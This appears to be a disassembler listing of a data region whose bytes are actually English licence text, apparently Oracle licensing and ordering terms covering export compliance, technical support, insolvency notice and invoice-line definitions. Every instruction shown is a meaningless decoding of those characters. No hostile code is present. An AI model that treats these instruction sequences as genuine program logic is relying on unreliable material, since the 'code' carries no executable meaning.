  436ce3:	82 b7 20 50 65 72 6d 	xorb   $0x6d,0x72655020(%edi)
  436cea:	61                   	popa
  436ceb:	6e                   	outsb  %ds:(%esi),(%dx)
  436cec:	65 6e                	outsb  %gs:(%esi),(%dx)
  436cee:	74 20                	je     0x436d10
  436cf0:	66 75 6c             	data16 jne 0x436d5f
  436cf3:	6c                   	insb   (%dx),%es:(%edi)
  436cf4:	2d 74 69 6d 65       	sub    $0x656d6974,%eax
  436cf9:	20 6f 72             	and    %ch,0x72(%edi)
  436cfc:	20 70 61             	and    %dh,0x61(%eax)
  436cff:	72 74                	jb     0x436d75
  436d01:	2d 74 69 6d 65       	sub    $0x656d6974,%eax
  436d06:	20 4e 6f             	and    %cl,0x6f(%esi)
  436d09:	6e                   	outsb  %ds:(%esi),(%dx)
  436d0a:	2d 50 75 62 6c       	sub    $0x6c627550,%eax
  436d0f:	69 63 20 46 75 6e 64 	imul   $0x646e7546,0x20(%ebx),%esp
  436d16:	20 28                	and    %ch,(%eax)
  436d18:	4e                   	dec    %esi
  436d19:	50                   	push   %eax
  436d1a:	46                   	inc    %esi
  436d1b:	29 20                	sub    %esp,(%eax)
  436d1d:	6f                   	outsl  %ds:(%esi),(%dx)
  436d1e:	72 20                	jb     0x436d40
  436d20:	44                   	inc    %esp
  436d21:	4e                   	dec    %esi
  436d22:	44                   	inc    %esp
  436d23:	20 65 6d             	and    %ah,0x6d(%ebp)
  436d26:	70 6c                	jo     0x436d94
  436d28:	6f                   	outsl  %ds:(%esi),(%dx)
  436d29:	79 65                	jns    0x436d90
  436d2b:	65 20 6f 72          	and    %ch,%gs:0x72(%edi)
  436d2f:	20 61 6e             	and    %ah,0x6e(%ecx)
  436d32:	64 20 74 68 65       	and    %dh,%fs:0x65(%eax,%ebp,2)
  436d37:	69 72 20 73 70 6f 75 	imul   $0x756f7073,0x20(%edx),%esi
  436d3e:	73 65                	jae    0x436da5
  436d40:	3b 0a                	cmp    (%edx),%ecx
  436d42:	74 68                	je     0x436dac
  436d44:	65 73 65             	gs jae 0x436dac
  436d47:	20 66 65             	and    %ah,0x65(%esi)
  436d4a:	61                   	popa
  436d4b:	74 75                	je     0x436dc2
  436d4d:	72 65                	jb     0x436db4
  436d4f:	73 20                	jae    0x436d71
  436d51:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  436d54:	20 62 65             	and    %ah,0x65(%edx)
  436d57:	20 73 77             	and    %dh,0x77(%ebx)
  436d5a:	69 74 63 68 65 64 20 	imul   $0x6f206465,0x68(%ebx,%eiz,2),%esi
  436d61:	6f 
  436d62:	66 66 20 6f 72       	data16 data16 and %ch,0x72(%edi)
  436d67:	20 79 6f             	and    %bh,0x6f(%ecx)
  436d6a:	75 20                	jne    0x436d8c
  436d6c:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  436d6f:	20 63 68             	and    %ah,0x68(%ebx)
  436d72:	6f                   	outsl  %ds:(%esi),(%dx)
  436d73:	6f                   	outsl  %ds:(%esi),(%dx)
  436d74:	73 65                	jae    0x436ddb
  436d76:	20 6e 6f             	and    %ch,0x6f(%esi)
  436d79:	74 20                	je     0x436d9b
  436d7b:	74 6f                	je     0x436dec
  436d7d:	20 75 73             	and    %dh,0x73(%ebp)
  436d80:	65 20 74 68 65       	and    %dh,%gs:0x65(%eax,%ebp,2)
  436d85:	6d                   	insl   (%dx),%es:(%edi)
  436d86:	2e 0a 72 65          	or     %cs:0x65(%edx),%dh
  436d8a:	6c                   	insb   (%dx),%es:(%edi)
  436d8b:	61                   	popa
  436d8c:	74 69                	je     0x436df7
  436d8e:	6e                   	outsb  %ds:(%esi),(%dx)
  436d8f:	67 20 74 6f          	and    %dh,0x6f(%si)
  436d93:	20 74 68 69          	and    %dh,0x69(%eax,%ebp,2)
  436d97:	73 20                	jae    0x436db9
  436d99:	61                   	popa
  436d9a:	67 72 65             	addr16 jb 0x436e02
  436d9d:	65 6d                	gs insl (%dx),%es:(%edi)
  436d9f:	65 6e                	outsb  %gs:(%esi),(%dx)
  436da1:	74 20                	je     0x436dc3
  436da3:	6d                   	insl   (%dx),%es:(%edi)
  436da4:	61                   	popa
  436da5:	79 20                	jns    0x436dc7
  436da7:	62 65 20             	bound  %esp,0x20(%ebp)
  436daa:	62 72 6f             	bound  %esi,0x6f(%edx)
  436dad:	75 67                	jne    0x436e16
  436daf:	68 74 20 62 79       	push   $0x79622074
  436db4:	20 65 69             	and    %ah,0x69(%ebp)
  436db7:	74 68                	je     0x436e21
  436db9:	65 72 20             	gs jb  0x436ddc
  436dbc:	70 61                	jo     0x436e1f
  436dbe:	72 74                	jb     0x436e34
  436dc0:	79 20                	jns    0x436de2
  436dc2:	6d                   	insl   (%dx),%es:(%edi)
  436dc3:	6f                   	outsl  %ds:(%esi),(%dx)
  436dc4:	72 65                	jb     0x436e2b
  436dc6:	20 74 68 61          	and    %dh,0x61(%eax,%ebp,2)
  436dca:	6e                   	outsb  %ds:(%esi),(%dx)
  436dcb:	20 74 77 6f          	and    %dh,0x6f(%edi,%esi,2)
  436dcf:	20 79 65             	and    %bh,0x65(%ecx)
  436dd2:	61                   	popa
  436dd3:	72 73                	jb     0x436e48
  436dd5:	20 61 66             	and    %ah,0x66(%ecx)
  436dd8:	74 65                	je     0x436e3f
  436dda:	72 20                	jb     0x436dfc
  436ddc:	74 68                	je     0x436e46
  436dde:	65 20 63 61          	and    %ah,%gs:0x61(%ebx)
  436de2:	75 73                	jne    0x436e57
  436de4:	65 20 6f 66          	and    %ch,%gs:0x66(%edi)
  436de8:	20 61 63             	and    %ah,0x63(%ecx)
  436deb:	74 69                	je     0x436e56
  436ded:	6f                   	outsl  %ds:(%esi),(%dx)
  436dee:	6e                   	outsb  %ds:(%esi),(%dx)
  436def:	20 68 61             	and    %ch,0x61(%eax)
  436df2:	73 20                	jae    0x436e14
  436df4:	61                   	popa
  436df5:	63 63 72             	arpl   %esp,0x72(%ebx)
  436df8:	75 65                	jne    0x436e5f
  436dfa:	64 2e 0a 64 69 73    	fs or  %cs:0x73(%ecx,%ebp,2),%ah
  436e00:	63 6c 6f 73          	arpl   %ebp,0x73(%edi,%ebp,2)
  436e04:	65 2c 20             	gs sub $0x20,%al
  436e07:	75 73                	jne    0x436e7c
  436e09:	65 20 6f 72          	and    %ch,%gs:0x72(%edi)
  436e0d:	20 70 65             	and    %dh,0x65(%eax)
  436e10:	72 6d                	jb     0x436e7f
  436e12:	69 74 20 74 68 65 20 	imul   $0x64206568,0x74(%eax,%eiz,1),%esi
  436e19:	64 
  436e1a:	69 73 63 6c 6f 73 75 	imul   $0x75736f6c,0x63(%ebx),%esi
  436e21:	72 65                	jb     0x436e88
  436e23:	20 6f 72             	and    %ch,0x72(%edi)
  436e26:	20 75 73             	and    %dh,0x73(%ebp)
  436e29:	65 20 62 79          	and    %ah,%gs:0x79(%edx)
  436e2d:	20 6f 74             	and    %ch,0x74(%edi)
  436e30:	68 65 72 73 20       	push   $0x20737265
  436e35:	6f                   	outsl  %ds:(%esi),(%dx)
  436e36:	66 20 74 68 65       	data16 and %dh,0x65(%eax,%ebp,2)
  436e3b:	20 54 52 4d          	and    %dl,0x4d(%edx,%edx,2)
  436e3f:	73 20                	jae    0x436e61
  436e41:	66 6f                	outsw  %ds:(%esi),(%dx)
  436e43:	72 20                	jb     0x436e65
  436e45:	61                   	popa
  436e46:	6e                   	outsb  %ds:(%esi),(%dx)
  436e47:	79 20                	jns    0x436e69
  436e49:	6f                   	outsl  %ds:(%esi),(%dx)
  436e4a:	74 68                	je     0x436eb4
  436e4c:	65 72 20             	gs jb  0x436e6f
  436e4f:	70 75                	jo     0x436ec6
  436e51:	72 70                	jb     0x436ec3
  436e53:	6f                   	outsl  %ds:(%esi),(%dx)
  436e54:	73 65                	jae    0x436ebb
  436e56:	2e 20 59 6f          	and    %bl,%cs:0x6f(%ecx)
  436e5a:	75 20                	jne    0x436e7c
  436e5c:	73 68                	jae    0x436ec6
  436e5e:	61                   	popa
  436e5f:	6c                   	insb   (%dx),%es:(%edi)
  436e60:	6c                   	insb   (%dx),%es:(%edi)
  436e61:	20 6e 6f             	and    %ch,0x6f(%esi)
  436e64:	74 20                	je     0x436e86
  436e66:	75 73                	jne    0x436edb
  436e68:	65 20 74 68 65       	and    %dh,%gs:0x65(%eax,%ebp,2)
  436e6d:	20 54 52 4d          	and    %dl,0x4d(%edx,%edx,2)
  436e71:	73 20                	jae    0x436e93
  436e73:	74 6f                	je     0x436ee4
  436e75:	0a 73 65             	or     0x65(%ebx),%dh
  436e78:	72 76                	jb     0x436ef0
  436e7a:	69 63 65 73 20 64 65 	imul   $0x65642073,0x65(%ebx),%esp
  436e81:	6c                   	insb   (%dx),%es:(%edi)
  436e82:	69 76 65 72 61 62 6c 	imul   $0x6c626172,0x65(%esi),%esi
  436e89:	65 73 20             	gs jae 0x436eac
  436e8c:	70 72                	jo     0x436f00
  436e8e:	6f                   	outsl  %ds:(%esi),(%dx)
  436e8f:	76 69                	jbe    0x436efa
  436e91:	64 65 64 20 75 6e    	fs gs and %dh,%fs:0x6e(%ebp)
  436e97:	64 65 72 20          	fs gs jb 0x436ebb
  436e9b:	74 68                	je     0x436f05
  436e9d:	69 73 20 61 67 72 65 	imul   $0x65726761,0x20(%ebx),%esi
  436ea4:	65 6d                	gs insl (%dx),%es:(%edi)
  436ea6:	65 6e                	outsb  %gs:(%esi),(%dx)
  436ea8:	74 2c                	je     0x436ed6
  436eaa:	20 61 6e             	and    %ah,0x6e(%ecx)
  436ead:	64 20 79 6f          	and    %bh,%fs:0x6f(%ecx)
  436eb1:	75 20                	jne    0x436ed3
  436eb3:	61                   	popa
  436eb4:	67 72 65             	addr16 jb 0x436f1c
  436eb7:	65 20 74 6f 20       	and    %dh,%gs:0x20(%edi,%ebp,2)
  436ebc:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  436ebf:	70 6c                	jo     0x436f2d
  436ec1:	79 20                	jns    0x436ee3
  436ec3:	77 69                	ja     0x436f2e
  436ec5:	74 68                	je     0x436f2f
  436ec7:	20 61 6c             	and    %ah,0x6c(%ecx)
  436eca:	6c                   	insb   (%dx),%es:(%edi)
  436ecb:	20 73 75             	and    %dh,0x75(%ebx)
  436ece:	63 68 20             	arpl   %ebp,0x20(%eax)
  436ed1:	65 78 70             	gs js  0x436f44
  436ed4:	6f                   	outsl  %ds:(%esi),(%dx)
  436ed5:	72 74                	jb     0x436f4b
  436ed7:	20 6c 61 77          	and    %ch,0x77(%ecx,%eiz,2)
  436edb:	73 20                	jae    0x436efd
  436edd:	61                   	popa
  436ede:	6e                   	outsb  %ds:(%esi),(%dx)
  436edf:	64 20 72 65          	and    %dh,%fs:0x65(%edx)
  436ee3:	67 75 6c             	addr16 jne 0x436f52
  436ee6:	61                   	popa
  436ee7:	74 69                	je     0x436f52
  436ee9:	6f                   	outsl  %ds:(%esi),(%dx)
  436eea:	6e                   	outsb  %ds:(%esi),(%dx)
  436eeb:	73 0a                	jae    0x436ef7
  436eed:	77 69                	ja     0x436f58
  436eef:	74 68                	je     0x436f59
  436ef1:	20 72 65             	and    %dh,0x65(%edx)
  436ef4:	6c                   	insb   (%dx),%es:(%edi)
  436ef5:	65 76 61             	gs jbe 0x436f59
  436ef8:	6e                   	outsb  %ds:(%esi),(%dx)
  436ef9:	74 20                	je     0x436f1b
  436efb:	68 61 72 64 77       	push   $0x77647261
  436f00:	61                   	popa
  436f01:	72 65                	jb     0x436f68
  436f03:	20 61 6e             	and    %ah,0x6e(%ecx)
  436f06:	64 20 73 6f          	and    %dh,%fs:0x6f(%ebx)
  436f0a:	66 74 77             	data16 je 0x436f84
  436f0d:	61                   	popa
  436f0e:	72 65                	jb     0x436f75
  436f10:	20 76 65             	and    %dh,0x65(%esi)
  436f13:	6e                   	outsb  %ds:(%esi),(%dx)
  436f14:	64 6f                	outsl  %fs:(%esi),(%dx)
  436f16:	72 73                	jb     0x436f8b
  436f18:	2c 20                	sub    $0x20,%al
  436f1a:	73 6f                	jae    0x436f8b
  436f1c:	20 74 68 61          	and    %dh,0x61(%eax,%ebp,2)
  436f20:	74 20                	je     0x436f42
  436f22:	74 68                	je     0x436f8c
  436f24:	65 79 20             	gs jns 0x436f47
  436f27:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  436f2a:	20 75 73             	and    %dh,0x73(%ebp)
  436f2d:	65 20 74 68 65       	and    %dh,%gs:0x65(%eax,%ebp,2)
  436f32:	20 69 6e             	and    %ch,0x6e(%ecx)
  436f35:	66 6f                	outsw  %ds:(%esi),(%dx)
  436f37:	72 6d                	jb     0x436fa6
  436f39:	61                   	popa
  436f3a:	74 69                	je     0x436fa5
  436f3c:	6f                   	outsl  %ds:(%esi),(%dx)
  436f3d:	6e                   	outsb  %ds:(%esi),(%dx)
  436f3e:	20 74 6f 20          	and    %dh,0x20(%edi,%ebp,2)
  436f42:	69 6d 70 72 6f 76 65 	imul   $0x65766f72,0x70(%ebp),%ebp
  436f49:	20 68 6f             	and    %ch,0x6f(%eax)
  436f4c:	77 20                	ja     0x436f6e
  436f4e:	74 68                	je     0x436fb8
  436f50:	65 69 72 0a 74 65 63 	imul   $0x68636574,%gs:0xa(%edx),%esi
  436f57:	68 
  436f58:	6e                   	outsb  %ds:(%esi),(%dx)
  436f59:	6f                   	outsl  %ds:(%esi),(%dx)
  436f5a:	6c                   	insb   (%dx),%es:(%edi)
  436f5b:	6f                   	outsl  %ds:(%esi),(%dx)
  436f5c:	67 79 20             	addr16 jns 0x436f7f
  436f5f:	6f                   	outsl  %ds:(%esi),(%dx)
  436f60:	72 20                	jb     0x436f82
  436f62:	6f                   	outsl  %ds:(%esi),(%dx)
  436f63:	74 68                	je     0x436fcd
  436f65:	65 72 20             	gs jb  0x436f88
  436f68:	66 75 6c             	data16 jne 0x436fd7
  436f6b:	6c                   	insb   (%dx),%es:(%edi)
  436f6c:	2d 76 6f 6c 75       	sub    $0x756c6f76,%eax
  436f71:	6d                   	insl   (%dx),%es:(%edi)
  436f72:	65 20 64 69 73       	and    %ah,%gs:0x73(%ecx,%ebp,2)
  436f77:	6b 20 64             	imul   $0x64,(%eax),%esp
  436f7a:	72 69                	jb     0x436fe5
  436f7c:	76 65                	jbe    0x436fe3
  436f7e:	20 65 6e             	and    %ah,0x6e(%ebp)
  436f81:	63 72 79             	arpl   %esi,0x79(%edx)
  436f84:	70 74                	jo     0x436ffa
  436f86:	69 6f 6e 20 74 65 63 	imul   $0x63657420,0x6e(%edi),%ebp
  436f8d:	68 6e 6f 6c 6f       	push   $0x6f6c6f6e
  436f92:	67 79 20             	addr16 jns 0x436fb5
  436f95:	6d                   	insl   (%dx),%es:(%edi)
  436f96:	61                   	popa
  436f97:	79 20                	jns    0x436fb9
  436f99:	62 65 20             	bound  %esp,0x20(%ebp)
  436f9c:	6c                   	insb   (%dx),%es:(%edi)
  436f9d:	65 73 73             	gs jae 0x437013
  436fa0:	20 73 65             	and    %dh,0x65(%ebx)
  436fa3:	63 75 72             	arpl   %esi,0x72(%ebp)
  436fa6:	65 20 69 6e          	and    %ch,%gs:0x6e(%ecx)
  436faa:	20 61 20             	and    %ah,0x20(%ecx)
  436fad:	76 69                	jbe    0x437018
  436faf:	72 74                	jb     0x437025
  436fb1:	75 61                	jne    0x437014
  436fb3:	6c                   	insb   (%dx),%es:(%edi)
  436fb4:	69 7a 65 64 0a 41 72 	imul   $0x72410a64,0x65(%edx),%edi
  436fbb:	6d                   	insl   (%dx),%es:(%edi)
  436fbc:	65 64 20 53 65       	gs and %dl,%fs:0x65(%ebx)
  436fc1:	72 76                	jb     0x437039
  436fc3:	69 63 65 73 20 45 78 	imul   $0x78452073,0x65(%ebx),%esp
  436fca:	63 68 61             	arpl   %ebp,0x61(%eax)
  436fcd:	6e                   	outsb  %ds:(%esi),(%dx)
  436fce:	67 65 73 20          	addr16 gs jae 0x436ff2
  436fd2:	69 6e 20 61 63 63 6f 	imul   $0x6f636361,0x20(%esi),%ebp
  436fd9:	72 64                	jb     0x43703f
  436fdb:	61                   	popa
  436fdc:	6e                   	outsb  %ds:(%esi),(%dx)
  436fdd:	63 65 20             	arpl   %esp,0x20(%ebp)
  436fe0:	77 69                	ja     0x43704b
  436fe2:	74 68                	je     0x43704c
  436fe4:	20 61 70             	and    %ah,0x70(%ecx)
  436fe7:	70 6c                	jo     0x437055
  436fe9:	69 63 61 62 6c 65 20 	imul   $0x20656c62,0x61(%ebx),%esp
  436ff0:	55                   	push   %ebp
  436ff1:	2e 53                	cs push %ebx
  436ff3:	2e 20 46 65          	and    %al,%cs:0x65(%esi)
  436ff7:	64 65 72 61          	fs gs jb 0x43705c
  436ffb:	6c                   	insb   (%dx),%es:(%edi)
  436ffc:	20 73 74             	and    %dh,0x74(%ebx)
  436fff:	61                   	popa
  437000:	74 75                	je     0x437077
  437002:	74 65                	je     0x437069
  437004:	73 20                	jae    0x437026
  437006:	61                   	popa
  437007:	6e                   	outsb  %ds:(%esi),(%dx)
  437008:	64 20 72 65          	and    %dh,%fs:0x65(%edx)
  43700c:	67 75 6c             	addr16 jne 0x43707b
  43700f:	61                   	popa
  437010:	74 69                	je     0x43707b
  437012:	6f                   	outsl  %ds:(%esi),(%dx)
  437013:	6e                   	outsb  %ds:(%esi),(%dx)
  437014:	73 2e                	jae    0x437044
  437016:	20 54 68 65          	and    %dl,0x65(%eax,%ebp,2)
  43701a:	0a 49 66             	or     0x66(%ecx),%cl
  43701d:	20 79 6f             	and    %bh,0x6f(%ecx)
  437020:	75 20                	jne    0x437042
  437022:	64 65 63 69 64       	fs arpl %ebp,%gs:0x64(%ecx)
  437027:	65 20 74 6f 20       	and    %dh,%gs:0x20(%edi,%ebp,2)
  43702c:	70 75                	jo     0x4370a3
  43702e:	72 63                	jb     0x437093
  437030:	68 61 73 65 20       	push   $0x20657361
  437035:	74 65                	je     0x43709c
  437037:	63 68 6e             	arpl   %ebp,0x6e(%eax)
  43703a:	69 63 61 6c 20 73 75 	imul   $0x7573206c,0x61(%ebx),%esp
  437041:	70 70                	jo     0x4370b3
  437043:	6f                   	outsl  %ds:(%esi),(%dx)
  437044:	72 74                	jb     0x4370ba
  437046:	20 66 6f             	and    %ah,0x6f(%esi)
  437049:	72 20                	jb     0x43706b
  43704b:	61                   	popa
  43704c:	6e                   	outsb  %ds:(%esi),(%dx)
  43704d:	79 20                	jns    0x43706f
  43704f:	6c                   	insb   (%dx),%es:(%edi)
  437050:	69 63 65 6e 73 65 20 	imul   $0x2065736e,0x65(%ebx),%esp
  437057:	77 69                	ja     0x4370c2
  437059:	74 68                	je     0x4370c3
  43705b:	69 6e 20 61 20 6c 69 	imul   $0x696c2061,0x20(%esi),%ebp
  437062:	63 65 6e             	arpl   %esp,0x6e(%ebp)
  437065:	73 65                	jae    0x4370cc
  437067:	20 73 65             	and    %dh,0x65(%ebx)
  43706a:	74 2c                	je     0x437098
  43706c:	20 79 6f             	and    %bh,0x6f(%ecx)
  43706f:	75 20                	jne    0x437091
  437071:	61                   	popa
  437072:	72 65                	jb     0x4370d9
  437074:	20 72 65             	and    %dh,0x65(%edx)
  437077:	71 75                	jno    0x4370ee
  437079:	69 72 65 64 20 74 6f 	imul   $0x6f742064,0x65(%edx),%esi
  437080:	20 70 75             	and    %dh,0x75(%eax)
  437083:	72 63                	jb     0x4370e8
  437085:	68 61 73 65 20       	push   $0x20657361
  43708a:	74 65                	je     0x4370f1
  43708c:	63 68 6e             	arpl   %ebp,0x6e(%eax)
  43708f:	69 63 61 6c 20 73 75 	imul   $0x7573206c,0x61(%ebx),%esp
  437096:	70 70                	jo     0x437108
  437098:	6f                   	outsl  %ds:(%esi),(%dx)
  437099:	72 74                	jb     0x43710f
  43709b:	0a 79 6f             	or     0x6f(%ecx),%bh
  43709e:	75 20                	jne    0x4370c0
  4370a0:	62 65 63             	bound  %esp,0x63(%ebp)
  4370a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4370a4:	6d                   	insl   (%dx),%es:(%edi)
  4370a5:	65 20 73 75          	and    %dh,%gs:0x75(%ebx)
  4370a9:	62 6a 65             	bound  %ebp,0x65(%edx)
  4370ac:	63 74 20 74          	arpl   %esi,0x74(%eax,%eiz,1)
  4370b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4370b1:	20 69 6e             	and    %ch,0x6e(%ecx)
  4370b4:	73 6f                	jae    0x437125
  4370b6:	6c                   	insb   (%dx),%es:(%edi)
  4370b7:	76 65                	jbe    0x43711e
  4370b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4370ba:	63 79 20             	arpl   %edi,0x20(%ecx)
  4370bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4370be:	72 20                	jb     0x4370e0
  4370c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4370c1:	74 68                	je     0x43712b
  4370c3:	65 72 20             	gs jb  0x4370e6
  4370c6:	73 69                	jae    0x437131
  4370c8:	6d                   	insl   (%dx),%es:(%edi)
  4370c9:	69 6c 61 72 20 6c 65 	imul   $0x67656c20,0x72(%ecx,%eiz,2),%ebp
  4370d0:	67 
  4370d1:	61                   	popa
  4370d2:	6c                   	insb   (%dx),%es:(%edi)
  4370d3:	20 70 72             	and    %dh,0x72(%eax)
  4370d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4370d7:	63 65 65             	arpl   %esp,0x65(%ebp)
  4370da:	64 69 6e 67 73 2c 20 	imul   $0x79202c73,%fs:0x67(%esi),%ebp
  4370e1:	79 
  4370e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4370e3:	75 20                	jne    0x437105
  4370e5:	77 69                	ja     0x437150
  4370e7:	6c                   	insb   (%dx),%es:(%edi)
  4370e8:	6c                   	insb   (%dx),%es:(%edi)
  4370e9:	20 70 72             	and    %dh,0x72(%eax)
  4370ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4370ed:	6d                   	insl   (%dx),%es:(%edi)
  4370ee:	70 74                	jo     0x437164
  4370f0:	6c                   	insb   (%dx),%es:(%edi)
  4370f1:	79 20                	jns    0x437113
  4370f3:	73 65                	jae    0x43715a
  4370f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4370f6:	64 20 77 72          	and    %dh,%fs:0x72(%edi)
  4370fa:	69 74 74 65 6e 20 6e 	imul   $0x6f6e206e,0x65(%esp,%esi,2),%esi
  437101:	6f 
  437102:	74 69                	je     0x43716d
  437104:	63 65 20             	arpl   %esp,0x20(%ebp)
  437107:	74 6f                	je     0x437178
  437109:	3a 20                	cmp    (%eax),%ah
  43710b:	4f                   	dec    %edi
  43710c:	72 61                	jb     0x43716f
  43710e:	63 6c 65 20          	arpl   %ebp,0x20(%ebp,%eiz,2)
  437112:	45                   	inc    %ebp
  437113:	4d                   	dec    %ebp
  437114:	45                   	inc    %ebp
  437115:	41                   	inc    %ecx
  437116:	0a 57 68             	or     0x68(%edi),%dl
  437119:	61                   	popa
  43711a:	74 20                	je     0x43713c
  43711c:	61                   	popa
  43711d:	62 6f 75             	bound  %ebp,0x75(%edi)
  437120:	74 20                	je     0x437142
  437122:	75 70                	jne    0x437194
  437124:	67 72 61             	addr16 jb 0x437188
  437127:	64 69 6e 67 20 6f 72 	imul   $0x20726f20,%fs:0x67(%esi),%ebp
  43712e:	20 
  43712f:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  437132:	76 65                	jbe    0x437199
  437134:	72 74                	jb     0x4371aa
  437136:	69 6e 67 20 74 68 65 	imul   $0x65687420,0x67(%esi),%ebp
  43713d:	20 73 6f             	and    %dh,0x6f(%ebx)
  437140:	66 74 77             	data16 je 0x4371ba
  437143:	61                   	popa
  437144:	72 65                	jb     0x4371ab
  437146:	3f                   	aas
  437147:	20 49 66             	and    %cl,0x66(%ecx)
  43714a:	20 79 6f             	and    %bh,0x6f(%ecx)
  43714d:	75 20                	jne    0x43716f
  43714f:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  437156:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  43715a:	20 73 6f             	and    %dh,0x6f(%ebx)
  43715d:	66 74 77             	data16 je 0x4371d7
  437160:	61                   	popa
  437161:	72 65                	jb     0x4371c8
  437163:	20 63 6f             	and    %ah,0x6f(%ebx)
  437166:	76 65                	jbe    0x4371cd
  437168:	72 65                	jb     0x4371cf
  43716a:	64 20 62 79          	and    %ah,%fs:0x79(%edx)
  43716e:	20 74 68 69          	and    %dh,0x69(%eax,%ebp,2)
  437172:	73 0a                	jae    0x43717e
  437174:	70 72                	jo     0x4371e8
  437176:	65 76 65             	gs jbe 0x4371de
  437179:	6e                   	outsb  %ds:(%esi),(%dx)
  43717a:	74 20                	je     0x43719c
  43717c:	65 69 74 68 65 72 20 	imul   $0x61702072,%gs:0x65(%eax,%ebp,2),%esi
  437183:	70 61 
  437185:	72 74                	jb     0x4371fb
  437187:	79 20                	jns    0x4371a9
  437189:	66 72 6f             	data16 jb 0x4371fb
  43718c:	6d                   	insl   (%dx),%es:(%edi)
  43718d:	20 64 69 73          	and    %ah,0x73(%ecx,%ebp,2)
  437191:	63 6c 6f 73          	arpl   %ebp,0x73(%edi,%ebp,2)
  437195:	69 6e 67 20 74 68 65 	imul   $0x65687420,0x67(%esi),%ebp
  43719c:	20 74 65 72          	and    %dh,0x72(%ebp,%eiz,2)
  4371a0:	6d                   	insl   (%dx),%es:(%edi)
  4371a1:	73 20                	jae    0x4371c3
  4371a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4371a4:	72 20                	jb     0x4371c6
  4371a6:	70 72                	jo     0x43721a
  4371a8:	69 63 69 6e 67 20 75 	imul   $0x7520676e,0x69(%ebx),%esp
  4371af:	6e                   	outsb  %ds:(%esi),(%dx)
  4371b0:	64 65 72 20          	fs gs jb 0x4371d4
  4371b4:	74 68                	je     0x43721e
  4371b6:	69 73 20 61 67 72 65 	imul   $0x65726761,0x20(%ebx),%esi
  4371bd:	65 6d                	gs insl (%dx),%es:(%edi)
  4371bf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4371c1:	74 20                	je     0x4371e3
  4371c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4371c4:	72 20                	jb     0x4371e6
  4371c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4371c7:	72 64                	jb     0x43722d
  4371c9:	65 72 73             	gs jb  0x43723f
  4371cc:	20 73 75             	and    %dh,0x75(%ebx)
  4371cf:	62 6d 69             	bound  %ebp,0x69(%ebp)
  4371d2:	74 74                	je     0x437248
  4371d4:	65 64 20 75 6e       	gs and %dh,%fs:0x6e(%ebp)
  4371d9:	64 65 72 20          	fs gs jb 0x4371fd
  4371dd:	74 68                	je     0x437247
  4371df:	69 73 20 61 67 72 65 	imul   $0x65726761,0x20(%ebx),%esi
  4371e6:	65 6d                	gs insl (%dx),%es:(%edi)
  4371e8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4371ea:	74 20                	je     0x43720c
  4371ec:	69 6e 20 61 6e 79 0a 	imul   $0xa796e61,0x20(%esi),%ebp
  4371f3:	31 4b 20             	xor    %ecx,0x20(%ebx)
  4371f6:	49                   	dec    %ecx
  4371f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4371f8:	76 6f                	jbe    0x437269
  4371fa:	69 63 65 20 4c 69 6e 	imul   $0x6e694c20,0x65(%ebx),%esp
  437201:	65 3a 20             	cmp    %gs:(%eax),%ah
  437204:	69 73 20 64 65 66 69 	imul   $0x69666564,0x20(%ebx),%esi
  43720b:	6e                   	outsb  %ds:(%esi),(%dx)
  43720c:	65 64 20 61 73       	gs and %ah,%fs:0x73(%ecx)
  437211:	20 6f 6e             	and    %ch,0x6e(%edi)
  437214:	65 20 74 68 6f       	and    %dh,%gs:0x6f(%eax,%ebp,2)
  437219:	75 73                	jne    0x43728e
  43721b:	61                   	popa
  43721c:	6e                   	outsb  %ds:(%esi),(%dx)
  43721d:	64 20 69 6e          	and    %ch,%fs:0x6e(%ecx)
  437221:	76 6f                	jbe    0x437292
  437223:	69 63 65 20 6c 69 6e 	imul   $0x6e696c20,0x65(%ebx),%esp
  43722a:	65 20 69 74          	and    %ch,%gs:0x74(%ecx)
  43722e:	65 6d                	gs insl (%dx),%es:(%edi)
  437230:	73 20                	jae    0x437252
  437232:	70 72                	jo     0x4372a6
  437234:	6f                   	outsl  %ds:(%esi),(%dx)
  437235:	63 65 73             	arpl   %esp,0x73(%ebp)
  437238:	73 65                	jae    0x43729f
  43723a:	64 20 62 79          	and    %ah,%fs:0x79(%edx)
  43723e:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  437242:	20 70 72             	and    %dh,0x72(%eax)
  437245:	6f                   	outsl  %ds:(%esi),(%dx)
  437246:	67 72 61             	addr16 jb 0x4372aa
  437249:	6d                   	insl   (%dx),%es:(%edi)
  43724a:	20 64 75 72          	and    %ah,0x72(%ebp,%esi,2)
  43724e:	69 6e 67 20 61 20 31 	imul   $0x31206120,0x67(%esi),%ebp
  437255:	32 20                	xor    (%eax),%ah
  437257:	6d                   	insl   (%dx),%es:(%edi)
  437258:	6f                   	outsl  %ds:(%esi),(%dx)
  437259:	6e                   	outsb  %ds:(%esi),(%dx)
  43725a:	74 68                	je     0x4372c4
  43725c:	20 70 65             	and    %dh,0x65(%eax)
  43725f:	72 69                	jb     0x4372ca
  437261:	6f                   	outsl  %ds:(%esi),(%dx)
  437262:	64 2e 20 59 6f       	fs and %bl,%cs:0x6f(%ecx)
  437267:	75 0a                	jne    0x437273
  437269:	53                   	push   %ebx
  43726a:	65 72 76             	gs jb  0x4372e3
  43726d:	69 63 65 20 69 73 20 	imul   $0x20736920,0x65(%ebx),%esp
  437274:	61                   	popa
  437275:	76 61                	jbe    0x4372d8
